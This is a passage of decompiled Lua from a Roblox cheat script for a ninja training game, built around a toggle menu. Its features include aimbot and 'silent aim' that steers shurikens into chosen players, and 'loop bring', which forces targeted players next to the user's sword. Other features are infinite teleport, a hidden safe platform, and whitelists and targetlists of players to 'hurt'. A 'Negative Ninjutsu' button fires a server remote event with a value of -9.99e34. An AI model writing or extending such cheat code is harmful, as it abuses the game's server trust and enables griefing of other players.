                                local vu978 = Instance.new("Part", v977:FindFirstChild("HumanoidRootPart"))
                                local v979 = Instance.new("BillboardGui", vu978)
                                local vu980 = Instance.new("ImageLabel", v979)
                                vu978.Size = Vector3.new(1, 1, 1)
                                vu978.Position = vu64:FindFirstChild("HumanoidRootPart").Position
                                vu978.CanCollide = false
                                vu978.Transparency = 1
                                vu978.Anchored = true
                                v979.Size = UDim2.new(16, 0, 4, 0)
                                v979.SizeOffset = Vector2.new(0.25, 0)
                                v979.StudsOffset = Vector3.new(0, 2.5, 0)
                                v979.ZIndexBehavior = Enum.ZIndexBehavior.Global
                                v979.LightInfluence = 1
                                v979.MaxDistance = math.huge
                                vu980.BackgroundTransparency = 1
                                vu980.Size = UDim2.new(0.5, 0, 2, 0)
                                vu980.Image = "rbxassetid://1105721957"
                                vu980.ImageColor3 = Color3.new(0, 0, 0)
                                if vu63.Team.Name ~= "Yin" then
                                    if vu63.Team.Name == "Yang" then
                                        vu980.ImageColor3 = Color3.fromRGB(242, 243, 243)
                                    end
                                else
                                    vu980.ImageColor3 = Color3.fromRGB(0, 0, 0)
                                end
                                task.spawn(function()
                                    for _ = 1, 10 do
                                        vu980.ImageTransparency = vu980.ImageTransparency + 0.1
                                        if vu980.ImageTransparency == 1 then
                                            vu978:Destroy()
                                        end
                                        task.wait(0.0505)
                                    end
                                end)
                                vu975(vu976)
                                local v981 = vu64
                                vu64:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(Vector3.new(vu966.Hit.p.X, vu966.Hit.p.Y + 2, vu966.Hit.p.Z), Vector3.new(vu966.Hit.p.X, vu966.Hit.p.Y + 2, vu966.Hit.p.Z) + v981:FindFirstChild("HumanoidRootPart").CFrame.LookVector)
                                if vu976.Handle:FindFirstChildWhichIsA("Sound").IsPlaying then
                                    vu976.Handle:FindFirstChildWhichIsA("Sound"):Stop()
                                end
                                vu976.Handle:FindFirstChildWhichIsA("Sound"):Play()
                                vu63:FindFirstChild("LocalSounds").ErrorSound:Stop()
                            end
                        end)
                    end
                    function vu71.CharacterAdded.InfiniteTeleport()
                        if vu63.leaderstats.Ninjutsu.Value >= 63000 then
                            repeat
                                task.wait()
                            until vu63.Backpack:FindFirstChild("Teleport") or vu64:FindFirstChild("Teleport")
                            local vu982 = vu63.Backpack:FindFirstChild("Teleport") or vu64:FindFirstChild("Teleport")
                            infteleporting = vu982.Activated:Connect(function()
                                if vu70.InfiniteTeleport and vu63:FindFirstChild("leaderstats").Ninjutsu.Value / 10000 < (vu982.Handle.CFrame.p - vu966.Hit.p).Magnitude then
                                    local v983 = vu64
                                    local vu984 = Instance.new("Part", v983:FindFirstChild("HumanoidRootPart"))
                                    local v985 = Instance.new("BillboardGui", vu984)
                                    local vu986 = Instance.new("ImageLabel", v985)
                                    vu984.Size = Vector3.new(1, 1, 1)
                                    vu984.Position = vu64:FindFirstChild("HumanoidRootPart").Position
                                    vu984.CanCollide = false
                                    vu984.Transparency = 1
                                    vu984.Anchored = true
                                    v985.Size = UDim2.new(16, 0, 4, 0)
                                    v985.SizeOffset = Vector2.new(0.25, 0)
                                    v985.StudsOffset = Vector3.new(0, 2.5, 0)
                                    v985.ZIndexBehavior = Enum.ZIndexBehavior.Global
                                    v985.LightInfluence = 1
                                    v985.MaxDistance = math.huge
                                    vu986.BackgroundTransparency = 1
                                    vu986.Size = UDim2.new(0.5, 0, 2, 0)
                                    vu986.Image = "rbxassetid://1105721957"
                                    vu986.ImageColor3 = Color3.new(0, 0, 0)
                                    if vu63.Team.Name ~= "Yin" then
                                        if vu63.Team.Name == "Yang" then
                                            vu986.ImageColor3 = Color3.fromRGB(242, 243, 243)
                                        end
                                    else
                                        vu986.ImageColor3 = Color3.fromRGB(0, 0, 0)
                                    end
                                    task.spawn(function()
                                        for _ = 1, 10 do
                                            vu986.ImageTransparency = vu986.ImageTransparency + 0.1
                                            if vu986.ImageTransparency == 1 then
                                                vu984:Destroy()
                                            end
                                            task.wait(0.0505)
                                        end
                                    end)
                                    vu975(vu982)
                                    local v987 = vu64
                                    vu64:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(Vector3.new(vu966.Hit.p.X, vu966.Hit.p.Y + 2, vu966.Hit.p.Z), Vector3.new(vu966.Hit.p.X, vu966.Hit.p.Y + 2, vu966.Hit.p.Z) + v987:FindFirstChild("HumanoidRootPart").CFrame.LookVector)
                                    if vu982.Handle:FindFirstChildWhichIsA("Sound").IsPlaying then
                                        vu982.Handle:FindFirstChildWhichIsA("Sound"):Stop()
                                    end
                                    vu982.Handle:FindFirstChildWhichIsA("Sound"):Play()
                                    vu63:FindFirstChild("LocalSounds").ErrorSound:Stop()
                                end
                            end)
                        end
                    end
                else
                    pcall(function()
                        vu70.InfiniteTeleport = false
                        vu71.CharacterAdded.InfiniteTeleport = nil
                        infteleporting:Disconnect()
                    end)
                end
            end
        })
        v856:AddToggle("Safe Spot", {
            Title = "Safe Spot",
            Description = "Teleports you to a safe spot anywhere in the entire world. Uses X, Y, and Z variables of safe spot.",
            Default = false,
            Callback = function(p988)
                if p988 then
                    if vu64 and vu71.GetRoot(vu64) then
                        respos = vu71.GetRoot(vu64).CFrame
                        local v989 = Instance.new("Part", workspace)
                        v989.Name = "SAFEPART_1"
                        v989.CFrame = vu70.SafePartCFrame
                        v989.Anchored = true
                        v989.Size = Vector3.new(2048, 50, 2048)
                        v989.Color = Color3.fromRGB(99, 95, 98)
                        v989.Material = Enum.Material.Slate
                        vu71.GetRoot(vu64).CFrame = v989.CFrame + Vector3.new(0, 27, 0)
                    end
                else
                    if vu64 and vu71.GetRoot(vu64) and workspace:FindFirstChild("SAFEPART_1") then
                        vu71.GetRoot(vu64).CFrame = respos
                    end
                    if workspace:FindFirstChild("SAFEPART_1") then
                        workspace:FindFirstChild("SAFEPART_1"):Destroy()
                    end
                end
            end
        })
        vu476({
            AutoSpeed = false
        })
        v856:AddToggle("Auto Ctrl", {
            Title = "Auto Ctrl",
            Description = "Automatically presses left control, to bring your speed back to normal, when you take out a training sword.",
            Default = false,
            Callback = function(p990)
                if p990 then
                    oldConnect = vu64.ChildAdded:Connect(function(p991)
                        if vu70.AutoSpeed and p991.Name == "Train" and vu64:FindFirstChild("Humanoid") then
                            repeat
                                task.wait()
                            until vu64.Humanoid.WalkSpeed == 0
                            if vu53.LocalPlayer.Stats.SelectedWalkSpeed.Value ~= 0 then
                                vu64.Humanoid.WalkSpeed = vu53.LocalPlayer.Stats.SelectedWalkSpeed.Value
                            else
                                vu64.Humanoid.WalkSpeed = 100
                            end
                        elseif not vu70.AutoSpeed then
                            return
                        end
                    end)
                    function vu71.CharacterAdded.AutoSpeed()
                        oldConnect:Disconnect()
                        oldConnect = vu64.ChildAdded:Connect(function(p992)
                            if vu70.AutoSpeed and p992.Name == "Train" and vu64:FindFirstChild("Humanoid") then
                                repeat
                                    task.wait()
                                until vu64.Humanoid.WalkSpeed == 0
                                if vu53.LocalPlayer.Stats.SelectedWalkSpeed.Value ~= 0 then
                                    vu64.Humanoid.WalkSpeed = vu53.LocalPlayer.Stats.SelectedWalkSpeed.Value
                                else
                                    vu64.Humanoid.WalkSpeed = 100
                                end
                            elseif not vu70.AutoSpeed then
                                return
                            end
                        end)
                    end
                else
                    vu71.CharacterAdded.AutoSpeed = nil
                end
            end
        })
        local v993 = vu457.Training:AddSection("Training Settings")
        v993:AddInput("Train Amount", {
            Title = "Train Amount",
            Description = "Configures normal train amount",
            Default = 20,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p994)
                vu70.TrainAmount = tonumber(p994)
            end
        })
        v993:AddInput("Train Rate", {
            Title = "Train Rate",
            Description = "Configures normal train rate",
            Default = 0.7,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p995)
                vu70.TrainRate = tonumber(p995)
            end
        })
        local v996 = vu457.Training:AddSection("Auto Position Settings")
        v996:AddInput("Auto Position X Value", {
            Title = "Auto Position X Value",
            Description = "Configures auto position X value",
            Default = 0,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p997)
                vu70.Positioning.X = tonumber(p997)
            end
        })
        v996:AddInput("Auto Position Y Value", {
            Title = "Auto Position Y Value",
            Description = "Configures auto position Y value",
            Default = 0,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p998)
                vu70.Positioning.Y = tonumber(p998)
            end
        })
        v996:AddInput("Auto Position Z Value", {
            Title = "Auto Position Z Value",
            Description = "Configures auto position Z value",
            Default = 0,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p999)
                vu70.Positioning.Z = tonumber(p999)
            end
        })
        local v1000 = vu457.Training:AddSection("Safe Spot Settings")
        vu476({
            SafePartCFrame = CFrame.new(0, 200000, 0)
        })
        v1000:AddInput("Safe Spot X Value", {
            Title = "Safe Spot X Value",
            Description = "Configures safe spot X value",
            Default = 0,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1001)
                vu70.SafePartCFrame = CFrame.new(p1001, vu70.SafePartCFrame.Position.Y, vu70.SafePartCFrame.Position.Z)
                if workspace:FindFirstChild("SAFEPART_1") then
                    workspace:FindFirstChild("SAFEPART_1").CFrame = vu70.SafePartCFrame
                    if vu53.LocalPlayer.Character and vu71.GetRoot(vu53.LocalPlayer.Character) then
                        local _ = p1001 - workspace:FindFirstChild("SAFEPART_1").Position.X
                        vu71.GetRoot(vu53.LocalPlayer.Character).CFrame = vu70.SafePartCFrame + Vector3.new(0, 27, 0)
                    end
                end
            end
        })
        v1000:AddInput("Safe Spot Y Value", {
            Title = "Safe Spot Y Value",
            Description = "Configures safe spot Y value",
            Default = 200000,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1002)
                vu70.SafePartCFrame = CFrame.new(vu70.SafePartCFrame.Position.X, p1002, vu70.SafePartCFrame.Position.Z)
                if workspace:FindFirstChild("SAFEPART_1") then
                    workspace:FindFirstChild("SAFEPART_1").CFrame = vu70.SafePartCFrame
                    if vu53.LocalPlayer.Character and vu71.GetRoot(vu53.LocalPlayer.Character) then
                        local _ = p1002 - workspace:FindFirstChild("SAFEPART_1").Position.Y
                        vu71.GetRoot(vu53.LocalPlayer.Character).CFrame = vu70.SafePartCFrame + Vector3.new(0, 27, 0)
                    end
                end
            end
        })
        v1000:AddInput("Safe Spot Z Value", {
            Title = "Safe Spot Z Value",
            Description = "Configures safe spot Z value",
            Default = 0,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1003)
                vu70.SafePartCFrame = CFrame.new(vu70.SafePartCFrame.Position.X, vu70.SafePartCFrame.Position.Y, p1003)
                if workspace:FindFirstChild("SAFEPART_1") then
                    workspace:FindFirstChild("SAFEPART_1").CFrame = vu70.SafePartCFrame
                    if vu53.LocalPlayer.Character and vu71.GetRoot(vu53.LocalPlayer.Character) then
                        local _ = p1003 - workspace:FindFirstChild("SAFEPART_1").Position.Z
                        vu71.GetRoot(vu53.LocalPlayer.Character).CFrame = vu70.SafePartCFrame + Vector3.new(0, 27, 0)
                    end
                end
            end
        })
    end
    local function v1104()
        local v1005 = vu457.Lists:AddSection("Dropdowns")
        local v1006, v1007, v1008 = pairs(vu74)
        local vu1009 = {}
        local vu1010 = "Whitelist"
        local vu1011 = "Soft"
        local vu1012 = false
        while true do
            local v1013
            v1008, v1013 = v1006(v1007, v1008)
            if v1008 == nil then
                break
            end
            vu1009[v1008] = {}
            local v1014, v1015, v1016 = pairs(v1013)
            local v1017 = v1008
            while true do
                local v1018
                v1016, v1018 = v1014(v1015, v1016)
                if v1016 == nil then
                    break
                end
                vu1009[v1017][v1016] = vu71.GetListPlayersInServer(v1017, v1016)
            end
        end
        v1005:AddButton({
            Title = "List Terms",
            Callback = function()
                vu456:Dialog({
                    Title = "List Terms",
                    Content = "- Whitelist = Players you don\'t want to hurt.\n\n- Blacklist = Players you want to hurt first but then move onto the rest.\n\n- Targetlist = Players you ONLY want to hurt. Excludes the rest.\n\n- BreakShurslist = Players you want to break the shurikens of.\n\n- DisableShurslist = Players that disable the whole server\'s shurikens while they\'re in game.",
                    Buttons = {
                        {
                            Title = "Confirm",
                            Callback = function()
                            end
                        },
                        {
                            Title = "Cancel",
                            Callback = function()
                            end
                        }
                    }
                })
            end
        })
        v1005:AddButton({
            Title = "Mode Terms",
            Callback = function()
                vu456:Dialog({
                    Title = "List Terms",
                    Content = "- Soft = Unadds players from the list when they leave the game or when they spawn.\n\n- Semi = Unadds players from the list only when they leave the game.\n\n- Normal = Never unadds players unless manually unadded, however, it doesn\'t save when you leave the game.\n\n- Permanent = Never unadds players unless manually unadded. Saves when you leave the game.",
                    Buttons = {
                        {
                            Title = "Confirm",
                            Callback = function()
                            end
                        },
                        {
                            Title = "Cancel",
                            Callback = function()
                            end
                        }
                    }
                })
            end
        })
        local v1019 = v1005.AddDropdown
        local v1020 = {
            Title = "Soft Whitelist"
        }
        local v1021 = vu53
        v1020.Values = vu71.PlayersToStrings(v1021:GetPlayers())
        v1020.Multi = true
        v1020.Default = vu71.GetListPlayersInServer(vu1010, vu1011)
        v1019(v1005, "Multilist", v1020)
        v1005:AddDropdown("DropDownSelector", {
            Title = "Select DropDown",
            Values = {
                "Whitelist",
                "Blacklist",
                "Targetlist",
                "BreakShurlist",
                "DisableShurslist"
            },
            Multi = false,
            Default = vu1010
        })
        v1005:AddDropdown("ModeSelector", {
            Title = "Select Mode",
            Values = {
                "Soft",
                "Semi",
                "Normal",
                "Permanent"
            },
            Multi = false,
            Default = vu1011
        })
        v1005:AddButton({
            Title = "Refresh Multilist",
            Callback = function()
                local v1022 = vu53
                vu67.Multilist:SetValues(vu71.PlayersToStrings(v1022:GetPlayers()))
                vu67.Multilist:SetValue(vu71.GetListPlayersInServer(vu1010, vu1011))
            end
        })
        vu67.ModeSelector:OnChanged(function(p1023)
            vu1011 = p1023
            local v1024 = vu71.GetListPlayersInServer(vu1010, vu1011)
            vu67.Multilist:SetTitle(vu1011 .. " " .. vu1010)
            vu67.Multilist:SetValue(v1024)
            vu1009[vu1010][vu1011] = v1024
        end)
        vu67.DropDownSelector:OnChanged(function(p1025)
            vu1010 = p1025
            local v1026 = vu71.GetListPlayersInServer(vu1010, vu1011)
            vu67.Multilist:SetTitle(vu1011 .. " " .. vu1010)
            vu67.Multilist:SetValue(v1026)
            vu1009[vu1010][vu1011] = v1026
        end)
        vu67.Multilist:OnChanged(function(p1027)
            local v1028, v1029, v1030 = pairs(vu1009[vu1010][vu1011])
            local v1031 = {}
            while true do
                local v1032
                v1030, v1032 = v1028(v1029, v1030)
                if v1030 == nil then
                    break
                end
                if vu53:FindFirstChild(v1030) and (not p1027[v1030] and vu71.ListFind(vu1010, v1030, vu1011)) then
                    vu71.ListRemove(vu1010, v1030, vu1011)
                end
            end
            local v1033, v1034, v1035 = pairs(p1027)
            while true do
                local v1036
                v1035, v1036 = v1033(v1034, v1035)
                if v1035 == nil then
                    break
                end
                if vu53:FindFirstChild(v1035) then
                    v1031[v1035] = v1036
                    if not vu71.ListFind(vu1010, v1035, vu1011) then
                        vu71.ListInsert(vu1010, v1035, vu1011)
                    end
                end
            end
            vu1009[vu1010][vu1011] = v1031
        end)
        local vu1037 = vu457.Lists:AddSection("Advanced")
        vu1037:AddParagraph({
            Title = "Advanced Options",
            Content = "Select a list from any of the following selections and then choose what to do with it at the end."
        })
        vu476({
            AddAllLists = {}
        })
        local v1038, v1039, v1040 = pairs(vu74)
        while true do
            local v1041
            v1040, v1041 = v1038(v1039, v1040)
            if v1040 == nil then
                break
            end
            vu70.AddAllLists[v1040] = {}
            local v1042, v1043, v1044 = pairs(v1041)
            local v1045 = v1040
            while true do
                local v1046
                v1044, v1046 = v1042(v1043, v1044)
                if v1044 == nil then
                    break
                end
                vu70.AddAllLists[v1045][v1044] = false
            end
        end
        local function v1053(pu1047)
            vu1037:AddDropdown("Select" .. pu1047, {
                Title = pu1047 .. "s",
                Values = {
                    "Soft " .. pu1047,
                    "Semi " .. pu1047,
                    "Normal " .. pu1047,
                    "Permanent " .. pu1047
                },
                Multi = true,
                Default = {}
            }):OnChanged(function(p1048)
                local v1049, v1050, v1051 = pairs(vu70.AddAllLists[pu1047])
                while true do
                    local v1052
                    v1051, v1052 = v1049(v1050, v1051)
                    if v1051 == nil then
                        break
                    end
                    if p1048[v1051 .. " " .. pu1047] or not v1052 then
                        if p1048[v1051 .. " " .. pu1047] and not v1052 then
                            vu70.AddAllLists[pu1047][v1051] = true
                        end
                    else
                        vu70.AddAllLists[pu1047][v1051] = false
                    end
                end
            end)
        end
        v1053("Whitelist")
        v1053("Blacklist")
        v1053("Targetlist")
        v1053("BreakShurlist")
        v1053("DisableShurslist")
        vu1037:AddToggle("IncludeWhitelistedPlrs", {
            Title = "Include Whitelisted Players",
            Default = false,
            Callback = function(p1054)
                if p1054 then
                    vu1012 = true
                else
                    vu1012 = false
                end
            end
        })
        vu1037:AddToggle("AddAllListPlayers", {
            Title = "Add All Players To Selected Lists",
            Default = false,
            Callback = function(p1055)
                if p1055 then
                    local v1056 = vu53
                    local v1057, v1058, v1059 = pairs(v1056:GetPlayers())
                    while true do
                        local v1060
                        v1059, v1060 = v1057(v1058, v1059)
                        if v1059 == nil then
                            break
                        end
                        local v1061, v1062, v1063 = pairs(vu70.AddAllLists)
                        while true do
                            local v1064
                            v1063, v1064 = v1061(v1062, v1063)
                            if v1063 == nil then
                                break
                            end
                            local v1065, v1066, v1067 = pairs(v1064)
                            local v1068 = v1063
                            while true do
                                local v1069
                                v1067, v1069 = v1065(v1066, v1067)
                                if v1067 == nil then
                                    break
                                end
                                if v1069 and (not vu1012 and (v1068 ~= "Whitelist" and not vu71.ListFind("Whitelist", v1060.Name)) or vu1012) and not vu71.ListFind(v1068, v1060.Name, v1067) then
                                    vu71.ListInsert(v1068, v1060.Name, v1067)
                                end
                            end
                        end
                    end
                    function vu71.PlayerAdded.AddAllListPlayers(p1070)
                        local v1071, v1072, v1073 = pairs(vu70.AddAllLists)
                        while true do
                            local v1074
                            v1073, v1074 = v1071(v1072, v1073)
                            if v1073 == nil then
                                break
                            end
                            local v1075, v1076, v1077 = pairs(v1074)
                            local v1078 = v1073
                            while true do
                                local v1079
                                v1077, v1079 = v1075(v1076, v1077)
                                if v1077 == nil then
                                    break
                                end
                                if v1079 and (not vu1012 and (v1078 ~= "Whitelist" and not vu71.ListFind("Whitelist", p1070.Name)) or vu1012) and not vu71.ListFind(v1078, p1070.Name, v1077) then
                                    vu71.ListInsert(v1078, p1070.Name, v1077)
                                end
                            end
                        end
                    end
                    function vu71.PlayerRemoved.AddAllListPlayers(p1080)
                        local v1081, v1082, v1083 = pairs(vu70.AddAllLists)
                        while true do
                            local v1084
                            v1083, v1084 = v1081(v1082, v1083)
                            if v1083 == nil then
                                break
                            end
                            local v1085, v1086, v1087 = pairs(v1084)
                            local v1088 = v1083
                            while true do
                                local v1089
                                v1087, v1089 = v1085(v1086, v1087)
                                if v1087 == nil then
                                    break
                                end
                                if v1089 and vu71.ListFind(v1088, p1080.Name, v1087) then
                                    vu71.ListRemove(v1088, p1080.Name, v1087)
                                end
                            end
                        end
                    end
                else
                    pcall(function()
                        vu71.PlayerAdded.AddAllListPlayers = nil
                        vu71.PlayerRemoved.AddAllListPlayers = nil
                    end)
                end
            end
        })
        vu1037:AddButton({
            Title = "Remove All Players From Selected Lists",
            Callback = function()
                local v1090 = vu53
                local v1091, v1092, v1093 = pairs(v1090:GetPlayers())
                while true do
                    local v1094
                    v1093, v1094 = v1091(v1092, v1093)
                    if v1093 == nil then
                        break
                    end
                    local v1095, v1096, v1097 = pairs(vu70.AddAllLists)
                    while true do
                        local v1098, v1099 = v1095(v1096, v1097)
                        if v1098 == nil then
                            break
                        end
                        local v1100, v1101, v1102 = pairs(v1099)
                        v1097 = v1098
                        while true do
                            local v1103
                            v1102, v1103 = v1100(v1101, v1102)
                            if v1102 == nil then
                                break
                            end
                            if v1103 and vu71.ListFind(v1098, v1094.Name, v1102) then
                                vu71.ListRemove(v1098, v1094.Name, v1102)
                            end
                        end
                    end
                end
            end
        })
    end
    local function v1375()
        function vu71.IsWL(p1105)
            return vu71.GetListPlayersInServer("Whitelist")[p1105] ~= nil
        end
        local v1106 = vu457.Combat:AddSection("Buttons")
        v1106:AddButton({
            Title = "Get Bubble",
            Description = "Gets a bubble from the safe zone and teleports you back. You must have full health.",
            Callback = function()
                if vu64 and (vu64:FindFirstChild("Humanoid") and (not vu64:FindFirstChild("ForceField") and vu64.Humanoid.Health == vu64.Humanoid.MaxHealth)) then
                    vu64.Humanoid:UnequipTools()
                    vu71.GetBubble()
                end
            end
        })
        v1106:AddButton({
            Title = "Negative Ninjutsu",
            Description = "Gives you negative ninjutsu for godding others. You can use it while auto train is on as well.",
            Callback = function()
                local v1107 = vu67.AutoTrain.Value
                if v1107 then
                    vu67.AutoTrain:SetValue(false)
                end
                task.wait(0.72)
                game:GetService("ReplicatedStorage").RemoteEvent.AddPowerEvent:FireServer("FromTraining", - 9.99e34)
                task.wait(0.72)
                if v1107 then
                    vu67.AutoTrain:SetValue(true)
                end
            end
        })
        local v1108 = vu457.Combat:AddSection("Toggles")
        vu476({
            Aimbot = false,
            AimPart = "Head",
            FireOnGodMode = false
        })
        v1108:AddToggle("Aimbot", {
            Title = "Aimbot",
            Description = "Locks your camera onto the nearest player to you. Works best with shift lock or first person.",
            Default = false,
            Callback = function(p1109)
                if p1109 then
                    vu70.Aimbot = true
                    local vu1110 = false
                    local vu1111 = workspace.CurrentCamera
                    Aimbotting = vu55.RenderStepped:Connect(function()
                        if vu1110 and vu71.GetTargetPlayer() ~= nil then
                            local v1112 = vu71.GetTargetPlayer()
                            vu1111.CFrame = CFrame.new(vu1111.CFrame.Position, v1112:FindFirstChild(vu70.AimPart).Position)
                        end
                    end)
                    function vu71.UserInputBegan.Aimbot(p1113)
                        if p1113.UserInputType == Enum.UserInputType.MouseButton2 and vu70.Aimbot == true then
                            vu1110 = true
                        end
                    end
                    function vu71.UserInputEnded.UnAimbot(p1114)
                        if p1114.UserInputType == Enum.UserInputType.MouseButton2 and vu70.Aimbot == true then
                            vu1110 = false
                        end
                    end
                else
                    pcall(function()
                        vu70.Aimbot = false
                        vu71.UserInputBegan.Aimbotting = nil
                        vu71.UserInputEnded.UnAimbotting = nil
                        Aimbotting:Disconnect()
                    end)
                end
            end
        })
        vu476({
            SilentAim = false,
            FilterList = {},
            ShotgunFire = false,
            ShotgunFireSpread = 300,
            AirStrikeMode = false,
            AirStrikeDistance = 300,
            TeleportShuriken = false,
            RapidMode = false,
            RapidMultiplier = 10,
            PlrsTooClose = {}
        })
        v1108:AddToggle("SilentAim", {
            Title = "Silent Aim",
            Description = "Moves your shuriken to a speficied player after you shoot it. There are different modes as well.",
            Default = false,
            Callback = function(p1115)
                if p1115 then
                    vu70.SilentAim = true
                    local v1116 = vu56
                    local v1117, v1118, v1119 = pairs(v1116:GetDescendants())
                    while true do
                        local v1120
                        v1119, v1120 = v1117(v1118, v1119)
                        if v1119 == nil then
                            break
                        end
                        vu71.AddToFilterList(v1120)
                    end
                    function vu71.WorkspaceDescendantAdded.SilentAim(pu1121)
                        vu71.AddToFilterList(pu1121)
                        if pu1121.Name == "ThrownKunai" and (vu71.FormallyWaitForChild(pu1121, "creator") and (pu1121.creator.Value == vu53.LocalPlayer and vu70.SilentAim)) then
                            task.spawn(function()
                                local v1122, v1123, v1124 = vu71.SilentAimPreFunctions(pu1121)
                                while (pu1121.Parent == workspace or pu1121.Parent == vu56) and vu70.SilentAim do
                                    local v1125 = vu71.GetTargetPlayer()
                                    if v1125 then
                                        local v1126, v1127, v1128, v1129 = vu71.GetPostSilentAimVariables(pu1121, v1124, v1125)
                                        if v1127 and v1129 then
                                            local v1130 = vu71.CloseAndInRange(v1127, v1128, v1126)
                                            if v1123 <= 0 and not v1130 then
                                                vu71.SkyfallShuriken(pu1121)
                                            end
                                            v1122 = vu71.ShurikenProximityCheck(vu71.GetRaycastResult(v1126) or (v1122 or vu70.TeleportShuriken), v1130, v1127, v1129, pu1121)
                                            if not v1122 then
                                                pu1121.CFrame = CFrame.new(pu1121.Position, v1127.Position)
                                                v1129.Velocity = CFrame.new(pu1121.Position, v1127.Position).LookVector * vu71.CalculateBodyVelocity(v1127, pu1121, vu71.IsPlayerClose(v1127, v1128))
                                            end
                                        end
                                    end
                                    v1123 = v1123 + 1
                                    task.wait()
                                end
                            end)
                        end
                    end
                    function vu71.WorkspaceDescendantRemoved.SilentAim(p1131)
                        vu71.RemoveFromFilterList(p1131)
                    end
                    function vu71.PlayerRemoved.SilentAim(p1132)
                        if table.find(vu70.PlrsTooClose, p1132.Name) then
                            table.remove(vu70.PlrsTooClose, table.find(vu70.PlrsTooClose, p1132.Name))
                        end
                    end
                else
                    pcall(function()
                        vu70.SilentAim = false
                        vu71.WorkspaceDescendantAdded.SilentAim = nil
                        vu71.WorkspaceDescendantRemoved.SilentAim = nil
                        table.clear(vu70.FilterList)
                    end)
                end
            end
        })
        vu476({
            Loopbring = false,
            LoopBringDistance = 7
        })
        v1108:AddToggle("Loopbring", {
            Title = "Loop Bring",
            Description = "Constantly brings targetted players to your character so you can hit them with your sword.",
            Default = false,
            Callback = function(p1133)
                if p1133 then
                    vu70.Loopbring = false
                    task.wait()
                    vu70.Loopbring = true
                    task.spawn(function()
                        while vu70.Loopbring do
                            local v1134, v1135, v1136 = pairs(vu74.Targetlist)
                            while true do
                                local v1137
                                v1136, v1137 = v1134(v1135, v1136)
                                if v1136 == nil then
                                    break
                                end
                                local v1138, v1139, v1140 = pairs(v1137)
                                while true do
                                    local v1141
                                    v1140, v1141 = v1138(v1139, v1140)
                                    if v1140 == nil then
                                        break
                                    end
                                    if not vu71.ListFind("Whitelist", v1141) then
                                        local v1142 = vu53:FindFirstChild(v1141)
                                        if v1142 and (v1142.Character and (vu71.GetRoot(v1142.Character) and (vu53.LocalPlayer.Character and vu71.GetRoot(vu53.LocalPlayer.Character)))) and not v1142.Character:FindFirstChildWhichIsA("ForceField") then
                                            if vu64:FindFirstChild("Sword") and vu64:FindFirstChild("Sword"):FindFirstChild("Handle") then
                                                vu71.GetRoot(v1142.Character).CFrame = CFrame.new(vu64:FindFirstChild("Sword"):FindFirstChild("Handle").Position, vu71.GetRoot(v1142.Character).Position + vu71.GetRoot(vu64).CFrame.LookVector * 5) + vu71.GetRoot(vu64).CFrame.LookVector * 3
                                            else
                                                vu71.GetRoot(v1142.Character).CFrame = vu71.GetRoot(vu53.LocalPlayer.Character).CFrame + Vector3.new(vu70.LoopBringDistance, 1, 0)
                                            end
                                        end
                                    end
                                end
                            end
                            task.wait()
                        end
                    end)
                else
                    pcall(function()
                        vu70.Loopbring = false
                    end)
                end
            end
        })
        vu476({
            PredictMode = false,
            PredictModeOffset = 0.05
        })
        v1108:AddToggle("PredictBot", {
            Title = "Predict Bot",
            Description = "Predicts a player\'s movements and creates a part that the bot predicts will be the player\'s position in 3 seconds.",
            Default = false,
            Callback = function(p1143)
                if p1143 then
                    vu70.PredictMode = true
                    local vu1144 = workspace:FindFirstChild("SPEEDPART")
                    if not vu1144 then
                        vu1144 = Instance.new("Part", workspace)
                        vu1144.Name = "SPEEDPART"
                        vu1144.Size = Vector3.new(1, 1, 1)
                        vu1144.Material = Enum.Material.Neon
                        vu1144.Anchored = true
                        vu1144.CanCollide = false
                    end
                    coroutine.resume(coroutine.create(function()
                        while vu70.PredictMode do
                            local v1145 = vu71.GetTargetPlayer()
                            if v1145 and (v1145:FindFirstChild("Humanoid") and (v1145:FindFirstChild(vu70.AimPart) and (vu64 and vu71.GetRoot(vu64)))) then
                                local v1146 = (v1145:FindFirstChild(vu70.AimPart).Position - vu71.GetRoot(vu64).Position).Magnitude / 300
                                local v1147 = v1145:FindFirstChild(vu70.AimPart).Velocity.Magnitude * (v1146 + 0.01 + vu70.PredictModeOffset)
                                vu1144.Position = Vector3.new(v1145:FindFirstChild(vu70.AimPart).Position.X + v1145:FindFirstChild("Humanoid").MoveDirection.X * v1147, v1145:FindFirstChild(vu70.AimPart).Position.Y + v1145:FindFirstChild("Humanoid").MoveDirection.Y * v1147, v1145:FindFirstChild(vu70.AimPart).Position.Z + v1145:FindFirstChild("Humanoid").MoveDirection.Z * v1147)
                            end
                            task.wait()
                        end
                    end))
                else
                    pcall(function()
                        vu70.PredictMode = false
                        workspace:FindFirstChild("SPEEDPART"):Destroy()
                    end)
                end
            end
        })
        vu476({
            AutoBubble = false,
            AltAutoBubble = false
        })
        v1108:AddToggle("AutoBubble", {
            Title = "Auto Bubble",
            Description = "Automatically puts you in a bubble whenever you lose it. Can be configured in settings.",
            Default = false,
            Callback = function(p1148)
                if p1148 then
                    vu70.AutoBubble = true
                    while vu70.AutoBubble do
                        if vu64 and (vu64:FindFirstChild("Humanoid") and (not vu64:FindFirstChild("ForceField") and vu64.Humanoid.Health == vu64.Humanoid.MaxHealth)) then
                            if vu70.AltAutoBubble then
                                if not (vu64:FindFirstChild("Sword") or (vu64:FindFirstChild("Shuriken") or vu64:FindFirstChild("ForceField"))) then
                                    vu71.GetBubble()
                                end
                            else
                                vu64.Humanoid:UnequipTools()
                                vu71.GetBubble()
                            end
                        end
                        task.wait()
                    end
                else
                    vu70.AutoBubble = false
                end
            end
        })
        vu476({
            AutoTarget = false,
            AutoTargetMode = {
                Soft = true,
                Semi = false,
                Normal = false,
                Permanent = false
            }
        })
        v1108:AddToggle("AutoTarget", {
            Title = "Auto Target",
            Description = "Automatically adds players to a set targetlist when they hit you. Can be configured in settings.",
            Default = false,
            Callback = function(p1149)
                if p1149 then
